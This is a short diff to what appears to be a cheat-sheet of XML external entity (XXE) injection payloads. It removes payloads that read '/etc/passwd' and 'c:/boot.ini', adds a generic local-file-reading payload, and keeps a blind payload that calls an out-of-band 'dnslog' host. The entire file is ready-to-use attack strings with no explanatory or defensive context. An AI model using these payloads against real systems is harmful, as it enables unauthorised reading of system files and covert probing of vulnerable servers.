@@ -1,10 +1,7 @@
 # XXE payload
 
-# for Linux target
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-
-# for Windows target
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/boot.ini"> ]>
+# echo
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://filepath"> ]>
 
 # blind
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://dnslog"> ]>
